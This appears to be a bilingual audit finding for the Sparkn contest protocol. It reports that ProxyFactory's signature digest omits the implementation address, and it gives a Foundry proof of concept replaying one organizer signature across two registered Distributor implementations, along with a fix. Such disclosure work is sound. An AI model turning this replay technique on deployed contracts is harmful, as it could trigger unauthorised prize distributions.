# H-01 | 同一签名可在不同 Distributor Implementation 上重复使用

**项目名称：** Sparkn  
**漏洞等级：** High（高危）  
**漏洞类型：** 签名重放 / 授权范围缺陷 / 签名参数绑定不完整  
**受影响合约：** `src/ProxyFactory.sol`  
**受影响函数：** `deployProxyAndDistributeBySignature()`  
**测试文件：** `test/F01SignatureScope.t.sol`  
**测试工具：** Foundry  

---

## 1. Summary / 漏洞摘要

Sparkn 允许 Organizer 通过签名授权比赛奖金分配。第三方可以向 `ProxyFactory.deployProxyAndDistributeBySignature()` 提交有效签名，由 Factory 部署对应 Proxy，并执行 Distributor 奖金分配逻辑。

然而，Factory 在计算签名摘要时仅包含 `contestId` 和 `data`，没有将 `implementation` 地址纳入签名消息。

与此同时，Factory 使用 `organizer`、`contestId` 和 `implementation` 共同计算 CREATE2 Salt，以确定比赛注册状态和对应的 Proxy 地址。

这意味着：**两个 Implementation 可以对应不同的注册配置和 Proxy，但只要 `contestId`、`data` 以及 EIP-712 Domain 相同，它们使用的签名摘要就相同。**

攻击者或其他签名持有者可能将原本针对某个 Implementation 使用的签名，提交给另一个符合注册和时间条件的 Implementation。

本地 Foundry 测试已成功验证：

- 两个不同 Distributor Implementation 对应不同的 Proxy 地址。
- 同一个 Organizer 签名可以在两个 Implementation 上分别通过校验。
- 两次分配均成功完成。
- 两个 Proxy 中预存的模拟奖金分别被分配。

该问题属于签名授权范围不完整引起的跨 Implementation 签名复用风险。

## 2. Root Cause / 漏洞根本原因

问题位于 `ProxyFactory.sol` 的 `deployProxyAndDistributeBySignature()`。

原始合约通过以下方式计算签名摘要：

```solidity
bytes32 digest = _hashTypedDataV4(
    keccak256(abi.encode(contestId, data))
);

if (ECDSA.recover(digest, signature) != organizer) {
    revert ProxyFactory__InvalidSignature();
}
```

但后续的比赛识别与 Proxy 部署依赖另一个参数组合：

```solidity
bytes32 salt = _calculateSalt(
    organizer,
    contestId,
    implementation
);
```

两者使用的关键参数不同。

**签名摘要绑定：**

```text
EIP-712 Domain
    +
contestId
    +
data
```

**Proxy 注册与部署绑定：**

```text
organizer
    +
contestId
    +
implementation
```

关键区别是：`implementation` 参与了 Proxy 身份计算，却没有参与签名摘要计算。

假设：

```solidity
implementationX != implementationY
```

当两个调用使用同一个 `contestId` 和 `data` 时：

```text
digestX == digestY
```

但对应的 CREATE2 Salt 不同：

```text
saltX != saltY
```

因此，签名验证无法区分 Organizer 原本授权的是 Implementation X 还是 Implementation Y。

如果两个 Implementation 均满足 Factory 的注册及时间检查，同一个签名便可能分别触发两个不同 Proxy 的部署和分配。

**根本原因：签名消息没有完整绑定实际执行该授权操作所依赖的 Implementation 地址。**

## 3. Impact / 漏洞影响

### 3.1 跨 Implementation 签名复用

某个 Organizer 的有效签名可能在不同的已注册 Implementation 配置中重复使用，而不需要 Organizer 为第二个 Implementation 重新签名。

这违反了签名应当明确限定授权操作及执行目标的安全原则。

### 3.2 非预期奖金分配风险

Sparkn 的 Proxy 地址由 CREATE2 确定，Sponsor 可以提前向不同 Proxy 的预测地址转入奖金。

如果同一个签名可以授权不同 Proxy 执行分配，则签名持有者可能在满足注册条件的其他 Implementation 上触发奖金分配。

如果第二个 Implementation 的执行逻辑、资金处理方式或者授权目的与 Organizer 原本预期不同，可能产生未经预期的资金操作。

### 3.3 授权边界不完整

Factory 将 `implementation` 作为比赛配置的一部分，却没有要求 Organizer 的签名绑定该配置。

即使签名的 ECDSA 验证本身正确，也不能证明 Organizer 明确授权了当前传入的 Implementation。

### 3.4 影响范围与前提

本次 PoC 已证明同一签名能够跨两个不同的已注册 Implementation 重复使用。

但需要注意：

- 两个 Implementation 均由测试环境中的合法管理者注册。
- 两个 Implementation 均为原始 Distributor 的独立部署实例，业务逻辑相同。
- 测试没有构造恶意 Implementation。
- 测试没有证明外部攻击者能够未经授权注册新的 Implementation。
- 测试没有证明真实资金被盗。

因此，本次直接验证的是**跨 Implementation 签名作用域缺陷及重复执行行为**。

真实风险还取决于第二个 Implementation 是否已经注册、其具体逻辑以及相关资金的授权归属。

**漏洞等级说明：** High 沿用 Sparkn 2023 年历史审计报告中的 H-01 评级，并非本次研究单独完成的严重程度重新评估。

## 4. Proof of Concept (PoC) / 漏洞验证

### 4.1 Test Environment / 测试环境

**测试框架：** Foundry  
**Solidity 版本：** 0.8.18  
**测试文件：** `test/F01SignatureScope.t.sol`  
**原始合约：** `ProxyFactory.sol`、`Proxy.sol`、`Distributor.sol`  
**模拟代币：** `MockERC20.sol`  
**测试账户：** Organizer、Sponsor、Winner A、Winner B、Stadium  
**签名工具：** `vm.sign()`、`ECDSA.recover()`  
**部署机制：** CREATE2 / Proxy / delegatecall

所有测试均在本地 Foundry 环境中执行，使用模拟 USDC 和测试账户。

### 4.2 Test Scenario / 测试场景

测试部署两个不同的 Distributor 实例：

```solidity
implementationX = new Distributor(
    address(factory),
    stadium
);

implementationY = new Distributor(
    address(factory),
    stadium
);
```

随后，分别计算 Salt 和 Proxy 预测地址，并通过 Factory 注册两个比赛配置。

为两个尚未部署的 Proxy 地址预存模拟奖金：

**Proxy X：** 1,000 Token  
**Proxy Y：** 5,000 Token

两个 Proxy 在分配之前均没有部署代码，但已经持有相应的 ERC20 余额。

接着构造相同的分配数据：

**Winner A：** 60%  
**Winner B：** 35%  
**Stadium：** 剩余 5%

使用 Organizer 私钥生成一次签名。

之后，在比赛结束时间条件满足时：

**第一次调用：** 使用 Implementation X、原始签名和原始 `callData`，部署 Proxy X 并分配奖金。

**第二次调用：** 将 Implementation 地址替换成 Y，但保持同一个 Organizer、`contestId`、签名及 `callData`，尝试部署 Proxy Y 并完成奖金分配。

预期结果：两个调用均成功，而不需要重新生成签名。

### 4.3 Foundry PoC / 测试代码

**关键代码一：构造签名消息。**

```solidity
bytes32 structHash = keccak256(
    abi.encode(contestId, callData)
);

bytes32 digest = keccak256(
    abi.encodePacked(
        hex"1901",
        domainSeparator,
        structHash
    )
);

(uint8 v, bytes32 r, bytes32 s) =
    vm.sign(organizerPrivateKey, digest);

signature = abi.encodePacked(r, s, v);
```

该摘要没有包含 Implementation X 或 Y 的地址。

**关键代码二：第一次分配。**

```solidity
vm.prank(address(0x9999));

factory.deployProxyAndDistributeBySignature(
    organizer,
    contestId,
    address(implementationX),
    signature,
    callData
);
```

第一次调用成功后，检查：

```solidity
assertEq(usdc.balanceOf(winners[0]), 600e18);
assertEq(usdc.balanceOf(winners[1]), 350e18);
assertEq(usdc.balanceOf(stadium), 50e18);
assertEq(usdc.balanceOf(proxyY), 5000e18);
```

这证明 Proxy X 已完成分配，而 Proxy Y 原有奖金尚未被使用。

**关键代码三：复用同一签名。**

```solidity
vm.prank(address(0x8888));

address deployedY =
    factory.deployProxyAndDistributeBySignature(
        organizer,
        contestId,
        address(implementationY),
        signature,
        callData
    );
```

这里没有重新签名，只替换了 Implementation 地址。

随后验证：

```solidity
assertEq(proxyY, deployedY);
assertGt(proxyY.code.length, 0);

assertEq(usdc.balanceOf(proxyY), 0);
assertEq(usdc.balanceOf(winners[0]), 3600e18);
assertEq(usdc.balanceOf(winners[1]), 2100e18);
assertEq(usdc.balanceOf(stadium), 300e18);
```

完整 PoC 参见：

`test/F01SignatureScope.t.sol`

### 4.4 Key Assertions / 关键断言

**第一项：Implementation 身份不同**

```solidity
assertNotEq(
    address(implementationX),
    address(implementationY)
);
```

证明两次调用使用不同的合约实例。

**第二项：Salt 和 Proxy 地址不同**

```solidity
assertNotEq(saltX, saltY);
assertNotEq(proxyX, proxyY);
```

证明它们属于不同的 CREATE2 部署配置。

**第三项：两个注册配置均存在**

```solidity
assertGt(factory.saltToCloseTime(saltX), 0);
assertGt(factory.saltToCloseTime(saltY), 0);
```

证明第二次调用不是绕过比赛注册检查。

**第四项：第一次分配成功**

Proxy X 的 1,000 Token 被分配为：

- Winner A：600 Token
- Winner B：350 Token
- Stadium：50 Token

**第五项：相同签名在 Implementation Y 上再次成功**

Proxy Y 的 5,000 Token 被分配为：

- Winner A：3,000 Token
- Winner B：1,750 Token
- Stadium：250 Token

**第六项：最终余额守恒**

两次分配累计：

- Winner A：3,600 Token
- Winner B：2,100 Token
- Stadium：300 Token

三者合计 6,000 Token，与两个 Proxy 的初始预存奖金总额一致。

### 4.5 Test Execution / 测试执行

实际执行命令：

```bash
forge test --match-contract F01SignatureScopeTest -vv
```

Foundry 实际输出：

```text
[PASS] testOrganizerSignature() (gas: 505991)
[PASS] testRegisteredImplementations() (gas: 62050)

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

**实际结果：2 PASS，0 FAIL，0 SKIPPED。**

### 4.6 Test Results and Analysis / 测试结果分析

**已验证事实：**

1. 两个不同的 Distributor Implementation 可以分别注册。
2. 两个注册配置产生不同的 Salt 和 Proxy 地址。
3. 两个 Proxy 地址可以在部署前预存模拟奖金。
4. 相同的 Organizer 签名可以用于 Implementation X 和 Implementation Y。
5. 两次 Factory 调用均成功完成 Proxy 部署与奖金分配。
6. 两次分配后的余额符合预期。

**验证局限：**

1. 两个 Implementation 使用相同的 Distributor 业务代码。
2. 未模拟恶意或具有不同业务逻辑的 Implementation。
3. 未证明普通外部账户能够绕过 Owner 权限注册 Implementation。
4. 未证明真实生产环境发生未经授权的资金转移。
5. 未执行修复后回归测试。

因此，该 PoC 充分证明了**签名没有绑定 Implementation 所引发的跨配置复用行为**，但并未复现全部潜在攻击后果。

## 5. Recommendation / 修复建议

建议将 `implementation` 地址明确纳入 Organizer 签名的消息内容，使签名与实际执行目标绑定。

可定义完整的 EIP-712 结构化授权消息：

```solidity
bytes32 constant DISTRIBUTE_TYPEHASH =
    keccak256(
        "Distribute(bytes32 contestId,address implementation,bytes data)"
    );
```

然后计算：

```solidity
bytes32 structHash = keccak256(
    abi.encode(
        DISTRIBUTE_TYPEHASH,
        contestId,
        implementation,
        keccak256(data)
    )
);

bytes32 digest = _hashTypedDataV4(structHash);
```

通过这种方式，当 Implementation 地址变化时，签名摘要也会变化。

因此，为 Implementation X 生成的签名不能直接用于 Implementation Y。

此外建议：

1. 链下签名工具与链上合约采用完全一致的消息结构。
2. 对重要授权操作评估是否需要 nonce，防止同一授权被重复消费。
3. 根据业务需要增加 deadline，限制签名有效期。
4. 将比赛注册参数与签名授权参数进行统一安全审查。
5. 保证修复后的签名验证不能被其他入口绕过。

其中 nonce 与 deadline 属于进一步的签名安全加固，不能代替 Implementation 地址绑定。

**预期修复行为：**

Organizer 为 Implementation X 签署的授权，只能通过对应 Implementation X 的签名验证；将相同签名用于 Implementation Y 时，应因授权消息不匹配而被拒绝。

## 6. Fix Verification / 修复验证

**验证状态：Not Performed（尚未执行）。**

本次研究未修改原始 Sparkn 合约，也没有执行修复版本的 Foundry 回归测试。

后续修复验证应至少包含：

1. 原始 Implementation X 对应的合法签名能够通过验证。
2. 相同签名用于 Implementation Y 时必须失败。
3. 使用不同的 `contestId` 或 `data` 不能错误复用签名。
4. 修复后的奖金分配与手续费计算保持正确。
5. 新签名规则与前端编码一致。

本报告不声称漏洞已被修复。

## 7. Conclusion / 审计结论

Sparkn 的 `deployProxyAndDistributeBySignature()` 仅将 `contestId` 和 `data` 纳入签名消息，没有绑定 `implementation` 地址。

但 Factory 使用 Implementation 作为比赛注册和 CREATE2 Proxy 身份的一部分，导致**签名授权范围与实际执行目标之间存在不一致**。

本地 Foundry PoC 已成功验证，同一个 Organizer 签名能够在两个不同且已注册的 Implementation 配置下完成两次 Proxy 部署和奖金分配。

**测试结果：2 PASS，0 FAIL。**

该行为与 Sparkn 历史审计报告中的 H-01 问题一致。当前测试未进一步证明恶意 Implementation 或真实资产盗取情形。

